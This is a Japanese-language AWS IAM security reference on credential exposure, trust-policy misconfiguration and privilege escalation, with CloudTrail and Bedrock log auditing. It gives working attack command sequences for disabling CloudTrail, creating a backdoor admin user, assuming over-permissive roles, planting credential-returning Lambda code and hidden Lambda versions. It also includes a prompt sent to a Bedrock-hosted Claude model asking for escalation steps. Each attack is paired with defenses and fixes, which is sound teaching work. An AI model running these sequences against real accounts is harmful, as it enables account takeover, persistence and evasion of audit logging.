# AWS IAM セキュリティリファレンス

AWS IAMの認証情報露出・ロール誤設定・権限昇格の攻撃/防御パターンを解説する。サーバーレス環境で発生しやすいIAM関連の脆弱性と、CloudTrail/Bedrock監査手法を含む。

---

## 1. AWS IAM セキュリティ概要

### 1.1 IAMの基本概念

**主要なアイデンティティ:**

| 種類 | 説明 | 認証情報 |
|------|------|----------|
| **User** | 長期認証情報を持つ個別アイデンティティ | アクセスキー（`AccessKeyId` + `SecretAccessKey`） |
| **Group** | 複数のユーザーに一括で権限を付与する集合 | なし（ユーザーに権限を継承） |
| **Role** | 信頼されたエンティティが一時的に引き受けられる | AWS STSが発行する一時認証情報（セッショントークン付き） |

**ポリシーの種類:**

- **Managed policies**: AWS管理ポリシー / カスタマー管理ポリシー（複数プリンシパルに適用可能）
- **Inline policies**: 特定のUser/Group/Roleに直接埋め込まれたポリシー
- **Resource-based policies**: S3/Lambda/SQS等のリソースに直接付与されたポリシー

**重要用語:**

- **ARN (Amazon Resource Name)**: AWSリソースのグローバル一意識別子
- **AWS STS (Security Token Service)**: 一時認証情報を発行するサービス
- **Root user**: AWS アカウント作成時の最上位ユーザー（全権限保有）

**デフォルトはすべて拒否（Deny by Default）:**
IAMアイデンティティはデフォルトで権限を持たない。ポリシーを付与して初めてアクセスが許可される。

---

## 2. 認証情報の露出と悪用（Chapter 4）

### 2.1 フロントエンドコードからの認証情報露出

**攻撃シナリオ:**
クライアントサイドコード（HTML/JavaScript）にAWS認証情報をハードコード → ブラウザDevToolsや `wget` でダウンロード → 認証情報抽出 → AWS CLIで認証 → アカウント侵害

**攻撃手順:**

```bash
# 1. フロントエンドコードのダウンロード
mkdir search_for_creds && cd search_for_creds
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://localhost:3000

# 2. AWS認証情報パターンを検索
grep -rEo '"AKIA[0-9A-Z]{16}"' .
grep -rEo '"[A-Za-z0-9/+=]{40}"' .

# 3. JavaScriptコードをbeautifyして手動検査
npm install -g prettier
prettier --write '**/*.js' --tab-width 2 --single-quote
grep -rEi 'accessKey|secretAccess|aws_access|credentials|awsKey|awsSecret' .
```

**AWS CLI設定（Attacker側）:**

```bash
# 露出した認証情報でプロファイル設定
aws configure --profile target-account

# アカウントIDとIAMユーザー情報を確認
aws sts get-caller-identity --profile target-account
aws iam get-user --profile target-account

# IAMグループとポリシーを列挙
aws iam list-groups-for-user --user-name <user> --profile target-account
aws iam list-attached-user-policies --user-name <user> --profile target-account

# ポリシードキュメント取得
POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
aws iam get-policy --policy-arn $POLICY_ARN --profile target-account
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id v1 --profile target-account
```

**防御策:**

- ❌ **絶対にクライアントサイドコードに認証情報をハードコードしない**
- ✅ 認証情報はバックエンド（Lambda等）で管理
- ✅ フロントエンドはAmazon Cognito等の認証サービス経由でアクセス
- ✅ 認証情報ローテーションを定期実施
- ✅ AWS Secrets Manager / Systems Manager Parameter Storeでシークレット管理

---

### 2.2 CloudTrail ログ無効化による痕跡隠蔽

**攻撃シナリオ:**
`AdministratorAccess` 権限を持つ認証情報を取得 → CloudTrail Trail を列挙 → `StopLogging` APIで監査ログを停止 → 攻撃痕跡を隠蔽

**攻撃手順:**

```bash
# CloudTrail Trail一覧を取得（全リージョンで実行が必要）
aws cloudtrail list-trails --region us-east-1 --profile target-account

# Trail詳細取得
aws cloudtrail get-trail --name all-events --region us-east-1 --profile target-account

# Trail状態確認
aws cloudtrail get-trail-status --name all-events --region us-east-1 --profile target-account

# ログ無効化（⚠️ 攻撃者の行動）
aws cloudtrail stop-logging --name all-events --region us-east-1 --profile target-account
```

**防御策:**

- ✅ **Organization Trail**: AWS Organizations配下の全アカウントで一元管理
- ✅ **S3 Object Lock**: CloudTrailログをイミュータブルにして削除/改ざんを防止
- ✅ **Service Control Policy (SCP)**: `cloudtrail:StopLogging` / `cloudtrail:DeleteTrail` を拒否
- ✅ **Amazon EventBridge**: `StopLogging` イベントを検知してアラート発報
- ✅ CloudTrail Insights: 異常なAPI呼び出しパターンを検知

---

### 2.2.1 CloudTrail Trailの適切なセットアップ（防御側ベストプラクティス）

Trail設定は「作ればよい」ではなく、**何を記録するか**と**保護方法**が重要。2 Trail構成が推奨。

**推奨構成（2 Trail構成）:**

```bash
# Trail 2（監査専用）: 管理・データ・Insightsイベントを全記録
aws cloudtrail create-trail \
  --name all-events-02 \
  --s3-bucket-name <second-trail-bucket-name> \
  --include-global-service-events \
  --is-multi-region-trail \
  --enable-log-file-validation \
  --kms-key-id alias/cloudtrail-all-events-02

# S3オブジェクトレベル・Bedrockモデル呼び出しのデータイベントも記録
aws cloudtrail put-event-selectors \
  --trail-name all-events-02 \
  --advanced-event-selectors '[
    {"Name":"S3","FieldSelectors":[
      {"Field":"eventCategory","Equals":["Data"]},
      {"Field":"resources.type","Equals":["AWS::S3::Object"]}
    ]},
    {"Name":"Bedrock","FieldSelectors":[
      {"Field":"eventCategory","Equals":["Data"]},
      {"Field":"resources.type","Equals":["AWS::Bedrock::Model"]}
    ]}
  ]'

# Insights（APIコールレート・エラーレートの異常検知）を有効化
aws cloudtrail put-insight-selectors \
  --trail-name all-events-02 \
  --insight-selectors '[{"InsightType":"ApiCallRateInsight"},{"InsightType":"ApiErrorRateInsight"}]'

aws cloudtrail start-logging --name all-events-02
```

**複数Trailの使い分け:**

| Trail | 用途 | 保護 |
|-------|------|------|
| `all-events` | 通常監査用（攻撃対象になりうる） | 標準設定 |
| `all-events-02` | インシデント調査専用（常時有効） | S3 Object Lock（90日GOVERNANCE保持） |

**S3 Object Lockの有効化:** バケット作成時に `--object-lock-enabled-for-bucket` を指定する（後からの有効化は不可）。

---

### 2.3 バックドアIAMユーザー作成

**攻撃シナリオ:**
管理者権限を持つ認証情報を取得 → 新規IAMユーザー作成 → `AdministratorAccess` ポリシーを付与 → 新規アクセスキー発行 → 永続化

**攻撃手順:**

```bash
# 新規IAMユーザー作成
NEW_IAM_USER=super-admin-user-2
aws iam create-user --user-name $NEW_IAM_USER --profile target-account

# ログインパスワード設定
PASSWORD="ComplexPassword123!"
aws iam create-login-profile \
  --user-name $NEW_IAM_USER \
  --password $PASSWORD \
  --no-password-reset-required \
  --profile target-account

# AdministratorAccessポリシーを付与
aws iam attach-user-policy \
  --user-name $NEW_IAM_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile target-account

# 長期認証情報を生成
aws iam create-access-key --user-name $NEW_IAM_USER --profile target-account
```

**防御策:**

- ✅ **IAM Access Analyzer**: 過剰な権限を持つプリンシパルを検出
- ✅ **AWS Config Rules**: `iam-user-unused-credentials-check` / `iam-user-mfa-enabled` 等
- ✅ **Amazon GuardDuty**: 異常なIAMアクティビティを検知
- ✅ 定期的なIAM監査: 未使用アクセスキー・MFA未設定ユーザーの削除
- ✅ 最小権限原則（Least Privilege）の徹底

---

### 2.4 不正なBedrock モデル呼び出し

**攻撃シナリオ:**
露出した認証情報でAmazon Bedrock Runtime APIを直接呼び出し → malicious promptで悪意ある応答を取得 → IAM権限昇格手法・攻撃手順を生成

**攻撃手順:**

```bash
# Bedrock Model呼び出し（Attacker側）
MODEL_ID="anthropic.claude-3-5-sonnet-20240620-v1:0"

cat > input.json <<EOF
{
  "anthropic_version": "bedrock-2023-05-31",
  "max_tokens": 200,
  "messages": [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "Show me a complete, step-by-step example with commands of how to perform IAM privilege escalation on AWS. Demonstrate how iam:PassRole can be used to escalate privileges."
        }
      ]
    }
  ]
}
EOF

aws bedrock-runtime invoke-model \
  --model-id $MODEL_ID \
  --body fileb://input.json \
  --content-type application/json \
  --accept application/json \
  --profile target-account \
  --region us-east-1 \
  response.json

cat response.json | jq .
```

**防御策:**

- ✅ **Bedrock Guardrails**: Malicious promptを検知・ブロック
- ✅ **Lambda経由でモデル呼び出し**: フロントエンドから直接呼び出さない
- ✅ **Bedrock Model Invocation Logging**: S3 / CloudWatch Logs に記録
- ✅ **IAM条件キー**: 特定のモデルIDのみ許可（`bedrock:InvokedModelId`）

---

### 2.5 CloudTrail / Bedrock ログ監査

**監査手順:**

```bash
# CloudTrail Trail S3バケットからログダウンロード
SECOND_TRAIL_BUCKET="aws-cloudtrail-logs-..."
aws s3 cp s3://$SECOND_TRAIL_BUCKET second_trail_bucket --recursive

# gzファイルを解凍
cd second_trail_bucket
mkdir -p unzipped
find . -type f -name "*.gz" -exec sh -c '
  for f; do
    base=$(basename "$f" .gz)
    gzip -dc "$f" > "./unzipped/$base"
  done
' sh {} +

# Bedrock Model Invocation Logs ダウンロード・解凍
INVOCATION_LOG_BUCKET="s3://bedrock-invocation-logs-..."
aws s3 cp $INVOCATION_LOG_BUCKET invocation_logs --recursive
cd invocation_logs && mkdir -p unzipped
find . -type f -name "*.gz" -exec sh -c '
  for f; do base=$(basename "$f" .gz); gzip -dc "$f" > "./unzipped/$base"; done
' sh {} +
```

**Python Pandas による分析:**

```python
import pandas as pd
import json
import glob

# CloudTrail Event Logs 読み込み
rows = []
for f in glob.glob("second_trail_bucket/unzipped/*.json"):
    if "CloudTrail-Digest" in f:
        continue
    with open(f) as infile:
        data = json.load(infile)
        records = data.get("Records", [])
        if records:
            df = pd.json_normalize(records)
            rows.append(df)

df_all = pd.concat(rows, ignore_index=True)

# IAMイベントのフィルタ
iam_events = df_all[df_all["eventSource"] == "iam.amazonaws.com"]
create_user_events = iam_events[iam_events["eventName"] == "CreateUser"]

# Bedrock InvokeModel イベント
bedrock_events = df_all[df_all["eventSource"] == "bedrock.amazonaws.com"]
invoke_model_events = bedrock_events[bedrock_events["eventName"] == "InvokeModel"]
invoke_model_events["userIdentity.arn"].unique()

# Bedrock Model Invocation Logs 読み込み
rows = []
for f in glob.glob("invocation_logs/unzipped/*.json"):
    with open(f) as infile:
        for line in infile:
            line = line.strip()
            if not line:
                continue
            data = json.loads(line)
            df = pd.json_normalize(data)
            rows.append(df)

df_invocations = pd.concat(rows, ignore_index=True)

# CloudTrail Event と Bedrock Invocation Log を結合
merged_df = pd.merge(
    invoke_model_events,
    df_invocations,
    left_on="requestID",
    right_on="requestId",
    how="inner"
)

# 不正なプロンプト・応答を検査
merged_df.iloc[0].to_dict()
```

---

## 3. IAMロールの誤設定と権限昇格（Chapter 5）

### 3.1 IAMロール信頼ポリシー（Trust Policy）の脆弱パターン集

Trust Policyの誤設定はAssumeRole悪用の根本原因となる。代表的な脆弱パターンと修正版を対比で示す。

#### パターン1: ワイルドカードPrincipalで任意エンティティを許可

```json
// 脆弱: "AWS":"*" でインターネット上の任意AWSエンティティがAssumeRole可能（Conditionがあっても不完全な条件は回避される）
{"Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}

// 修正: 特定のサービスプリンシパルのみ許可
{"Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}
```

#### パターン2: 不完全な `aws:PrincipalArn` 条件

デバッグ用途でLambdaと開発者が同一ロールを共有する構成でよく発生する。

```json
// 脆弱: user/* でアカウント内の全IAMユーザーがAssumeRole可能
{
  "Statement": [
    {"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"},
    {
      "Effect": "Allow",
      "Principal": { "AWS": "*" },
      "Action": "sts:AssumeRole",
      "Condition": {"StringLike": {"aws:PrincipalArn": "arn:aws:iam::<ACCOUNT_ID>:user/*"}}
    }
  ]
}
```

問題点:
- `user/*` でアカウント内の**全IAMユーザー**がAssumeRole可能（特定ユーザーを限定できていない）
- `AWSLambda_FullAccess` + `sts:AssumeRole` を持つ開発者グループがあれば昇格が成立
- 攻撃者は `lambda:list-functions` でロールARNを特定 → そのまま AssumeRole を実行

**修正:** 明示ARN（`arn:aws:iam::<ACCOUNT_ID>:user/SpecificUser`）で指定。ワイルドカード禁止。

#### パターン3: サービスプリンシパルとIAMプリンシパルの混在リスク

LambdaとIAMユーザーで同一ロールを共有すると、ユーザーアカウントの侵害でLambda実行権限も奪われる。

**推奨アーキテクチャ:**
- Lambda実行ロールとデバッグ用ロールを**完全分離**する
- デバッグ用ロールへのAssumeRoleには `"aws:MultiFactorAuthPresent": "true"` 条件を必須化

---

### 3.1.5 AssumeRoleを悪用した権限昇格（実際の攻撃フロー）

**攻撃シナリオ:**
低権限開発者アカウント（`Developer001`）の認証情報を取得 → `sts:AssumeRole` 権限を持つ → 過剰な権限を持つIAMロール（`AdministratorAccess`）を引き受け → 権限昇格

**Trust Policy（脆弱な例）:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": { "AWS": "*" },
      "Action": "sts:AssumeRole",
      "Condition": {
        "StringLike": {
          "aws:PrincipalArn": "arn:aws:iam::<ACCOUNT_ID>:user/*"
        }
      }
    }
  ]
}
```

**攻撃手順:**

```bash
# Developer001 認証情報で認証
aws configure --profile target-dev-account

# Lambda関数を列挙してRoleを特定
aws lambda list-functions --region us-east-1 --profile target-dev-account | jq '.Functions[] | {FunctionName, Role}'

# AssumeRole実行
ACCOUNT_ID=$(aws sts get-caller-identity --profile target-dev-account --query Account --output text)
ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/lambda-assumable-role"

STS_OUTPUT=$(aws sts assume-role \
  --role-arn $ROLE_ARN \
  --role-session-name assume-session-000 \
  --profile target-dev-account)

# 一時認証情報をプロファイルに設定
KEY_ID=$(echo $STS_OUTPUT | jq -r ".Credentials.AccessKeyId")
SECRET_ACCESS_KEY=$(echo $STS_OUTPUT | jq -r ".Credentials.SecretAccessKey")
SESSION_TOKEN=$(echo $STS_OUTPUT | jq -r ".Credentials.SessionToken")

aws configure set aws_access_key_id $KEY_ID --profile assumed-lambda-role
aws configure set aws_secret_access_key $SECRET_ACCESS_KEY --profile assumed-lambda-role
aws configure set aws_session_token $SESSION_TOKEN --profile assumed-lambda-role

# 権限確認
aws sts get-caller-identity --profile assumed-lambda-role
aws iam list-attached-role-policies --role-name lambda-assumable-role --profile assumed-lambda-role
```

**防御策:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

- ✅ **Trust Policyから `"AWS": "*"` を削除**
- ✅ **IAMグループから `sts:AssumeRole` 権限を削除**
- ✅ **Permission Boundary**: ロールが引き受けられる最大権限を制限
- ✅ **IAM Access Analyzer**: 過剰な信頼関係を検出

---

### 3.2 Lambda関数コード改変攻撃（UpdateFunctionCode悪用）

**攻撃シナリオ:**
開発者アカウントが `lambda:UpdateFunctionCode` 権限を持つ → Lambda関数コードを改変して実行ロールの一時認証情報を返すコードを挿入 → 関数を呼び出して認証情報を取得 → 権限昇格

**攻撃チェーン（ステップ形式）:**

1. `aws lambda list-functions` でロールARN（`lambda-assumable-role`）を特定
2. `aws lambda get-function` でコードダウンロードURL（`Code.Location`）を取得
3. `curl` でZIPダウンロード → `unzip` で解凍 → 元のコードを確認
4. 悪意あるコード（boto3で実行ロールの認証情報を返す）に置き換え
5. `aws lambda update-function-code` で再デプロイ
6. `aws lambda wait function-updated` でデプロイ完了を待機（必須）
7. `aws lambda invoke --qualifier '$LATEST'` で関数呼び出し → 一時認証情報を取得
8. 取得した `AccessKeyId/SecretAccessKey/SessionToken` でCLIプロファイル設定 → 権限昇格完了

**悪意あるコード（Step 4）:**

```bash
# 元のコードを悪意あるコードに置き換え
cat > lambda-0000/lambda_function.py <<'EOF'
import boto3

def lambda_handler(event, context):
    session = boto3.Session()
    credentials = session.get_credentials().get_frozen_credentials()
    return {
        'AccessKeyId': credentials.access_key,
        'SecretAccessKey': credentials.secret_key,
        'SessionToken': credentials.token
    }
EOF

# 再パッケージ・デプロイ
cd ~/lambda-0000 && zip -r ../function-new.zip .
aws lambda update-function-code \
  --function-name lambda-0000 \
  --zip-file fileb://../function-new.zip \
  --region us-east-1 \
  --profile target-dev-account

aws lambda wait function-updated \
  --function-name lambda-0000 --region us-east-1 --profile target-dev-account

# 実行ロールの一時認証情報を取得
aws lambda invoke \
  --function-name lambda-0000 --payload '{}' \
  --region us-east-1 --qualifier '$LATEST' \
  --profile target-dev-account output_response.json

cat output_response.json
# {"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "SessionToken": "..."}
```

**重要:** `lambda:UpdateFunctionCode` 権限単体で、Lambda実行ロールの全権限を引き継げる。

**防御策:**

- ✅ **Lambdaに最小権限のExecution Roleを設定**（`AdministratorAccess` は絶対禁止）
- ✅ **lambda:UpdateFunctionCode** は本番環境では開発者から削除
- ✅ **Lambda関数バージョン管理**: 誰がいつコードを変更したかを追跡
- ✅ **Lambda Layer Verification**: 改ざんされていないLayerのみ許可
- ✅ **AWS Config Rule**: `lambda-function-settings-check` で設定を監査
- ✅ **CloudTrail監視**: `UpdateFunctionCode` イベントを検知してアラート発報

---

### 3.3 バックドアLambdaバージョンの作成と詳細管理

**攻撃シナリオ:**
一時的にmalicious codeをデプロイ → `lambda:PublishVersion` で固定バージョンを作成 → 元のコードに戻す → 過去のバージョンは残存（`--qualifier 2` で呼び出し可能） → 永続的バックドア

#### Lambdaバージョン管理の仕組み（$LATEST vs 版番号）

| 概念 | 特徴 |
|------|------|
| `$LATEST` | 常に最新デプロイを指す。コード変更が即反映。本番利用は非推奨 |
| 版番号（`1`, `2`, `3`...） | `PublishVersion` で作成するイミュータブルなスナップショット |
| エイリアス | バージョンまたは `$LATEST` への名前付きポインタ（`--qualifier prod` 等） |

```bash
# 全バージョンの一覧と各コードSHA256ハッシュを確認
aws lambda list-versions-by-function \
  --function-name lambda-0000 --region us-east-1 --profile admin-001 \
  | jq '.Versions[] | {Version, CodeSha256, LastModified}'
```

**攻撃手順（バックドア版の作成から隠蔽まで）:**

```bash
# 悪意あるコードをデプロイ済みの状態でバージョン2として固定
aws lambda publish-version --function-name lambda-0000 --region us-east-1 --profile admin-001

# 元のコードに戻してバージョン3を公開（バックドアを隠蔽）
aws lambda update-function-code \
  --function-name lambda-0000 --zip-file fileb://../function.zip --region us-east-1 --profile admin-001
aws lambda wait function-updated --function-name lambda-0000 --region us-east-1 --profile admin-001
aws lambda publish-version --function-name lambda-0000 --region us-east-1 --profile admin-001

# バージョン一覧（$LATEST、1、2、3が存在 - コンソールの「Code」タブは$LATESTのみ表示）
aws lambda list-versions-by-function \
  --function-name lambda-0000 --query 'Versions[].Version' --output text --region us-east-1 --profile admin-001
# $LATEST  1  2  3

# バージョン2（悪意あるコード）を直接呼び出し → 認証情報を取得
aws lambda invoke \
  --function-name lambda-0000 --payload '{}' \
  --region us-east-1 --qualifier '2' --profile admin-001 output_response.json
cat output_response.json  # {"AccessKeyId": "...", "SecretAccessKey": "...", "SessionToken": "..."}
```

**重要なポイント:**
- `$LATEST` 版は常に上書きされるが、版番号は永続する
- Lambda コンソールの「Code」タブは `$LATEST` を表示 → バックドア版は隠蔽される
- 版番号は昇順で自動付番 → 再利用不可
- 版番号指定での呼び出しは、Aliasを使えばFunction URL経由でも実行可能

**防御策:**

- ✅ **Lambda Function URL のアクセス制御**: 未認証アクセスを禁止
- ✅ **古いLambdaバージョンの定期削除**: 本番で使用していないバージョンを削除
- ✅ **AWS Config Rule (Custom)**: 未使用バージョンの検出
- ✅ **EventBridge Rule**: `lambda:PublishVersion` / `lambda:UpdateFunctionCode` イベントを監視
- ✅ **Service Control Policy**: 本番環境で `lambda:CreateFunctionUrlConfig` を制限
- ✅ **Versions/Aliasesタブ定期監査**: コンソールではなくCLIで全バージョンのCodeSHA256を検証

---

### 3.4 ExternalIdによるクロスアカウントAssumeRoleのセキュア化

**混乱した代理人（Confused Deputy）問題:**
サードパーティが複数顧客の代理でAssumeRoleを実行する場合、悪意ある顧客BがロールARNのみで他顧客AのロールをAssumeRoleできてしまう問題。

```json
// 安全: ExternalIdを必須条件として追加（顧客ごとに一意のランダム値）
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::<THIRD_PARTY_ACCOUNT_ID>:root"},
    "Action": "sts:AssumeRole",
    "Condition": {"StringEquals": {"sts:ExternalId": "<UNIQUE_UUID_PER_CUSTOMER>"}}
  }]
}
```

```bash
# 呼び出し側: ExternalIdを指定してAssumeRole
aws sts assume-role \
  --role-arn arn:aws:iam::<TARGET_ACCOUNT_ID>:role/cross-account-role \
  --external-id <UNIQUE_EXTERNAL_ID> \
  --role-session-name cross-account-session
```

**防御策:**
- ✅ クロスアカウントAssumeRoleには `sts:ExternalId` 条件を必須設定
- ✅ ExternalIdは顧客ごとに**一意のUUID**を使用（連番や推測可能な値は危険）
- ✅ ExternalIdはサードパーティとの安全なチャネルで共有する

---

## 4. AWS IAM セキュリティチェックリスト

### 4.1 認証情報管理

- [ ] クライアントサイドコードに認証情報をハードコードしていない
- [ ] AWS Secrets Manager / Systems Manager Parameter Store でシークレットを管理
- [ ] アクセスキーのローテーションを定期実施（90日以内推奨）
- [ ] 未使用の認証情報を削除（AWS Config: `iam-user-unused-credentials-check`）
- [ ] MFAをすべてのIAMユーザーに強制（`iam-user-mfa-enabled`）

### 4.2 IAMポリシーと権限

- [ ] 最小権限原則（Least Privilege）を適用
- [ ] `AdministratorAccess` を開発環境で使用しない
- [ ] Trust Policyに `"Principal": {"AWS": "*"}` を使用しない
- [ ] `sts:AssumeRole` 権限を必要最小限のプリンシパルにのみ付与
- [ ] Permission Boundaryでロールの最大権限を制限

### 4.3 Lambda実行ロール

- [ ] Lambda Execution Roleに `AdministratorAccess` を付与しない
- [ ] `lambda:UpdateFunctionCode` は本番環境で開発者から削除
- [ ] 古いLambdaバージョンを定期的に削除
- [ ] Lambda Function URLは認証必須に設定

### 4.4 監査・監視

- [ ] CloudTrail Organization Trail を有効化（全アカウント・全リージョン）
- [ ] CloudTrail Insights を有効化（異常API検知）
- [ ] Bedrock Model Invocation Logging を有効化
- [ ] S3 Object Lock でCloudTrailログをイミュータブル化
- [ ] EventBridge Rule で `StopLogging` / `CreateAccessKey` / `PublishVersion` を監視
- [ ] Amazon GuardDuty を有効化（異常アクティビティ検知）
- [ ] IAM Access Analyzer で過剰な権限を継続監査

---

## 5. 防御コマンド例

### 5.1 CloudTrail再有効化

```bash
aws cloudtrail start-logging --name all-events --region us-east-1
```

### 5.2 不正IAMユーザー削除

```bash
# アクセスキー削除
aws iam list-access-keys --user-name super-admin-user-2 | jq -r '.AccessKeyMetadata[].AccessKeyId' | \
  xargs -I {} aws iam delete-access-key --user-name super-admin-user-2 --access-key-id {}

# ログインプロファイル削除
aws iam delete-login-profile --user-name super-admin-user-2

# ポリシーデタッチ
aws iam detach-user-policy \
  --user-name super-admin-user-2 \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# ユーザー削除
aws iam delete-user --user-name super-admin-user-2
```

### 5.3 Lambda実行ロールの権限最小化

```bash
# AdministratorAccessポリシーをデタッチ
aws iam detach-role-policy \
  --role-name lambda-assumable-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 最小権限ポリシーを作成・アタッチ
cat > lambda-minimal-policy.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:*"
    }
  ]
}
EOF

aws iam create-policy \
  --policy-name LambdaMinimalExecution \
  --policy-document file://lambda-minimal-policy.json

aws iam attach-role-policy \
  --role-name lambda-assumable-role \
  --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/LambdaMinimalExecution
```

### 5.4 Trust Policyの修正

```bash
cat > trust-policy-fixed.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam update-assume-role-policy \
  --role-name lambda-assumable-role \
  --policy-document file://trust-policy-fixed.json
```

---

## 参考リソース

- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [AWS Security Token Service (STS) API Reference](https://docs.aws.amazon.com/STS/latest/APIReference/)
- [CloudTrail Log File Examples](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html)
- [AWS Lambda Security Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
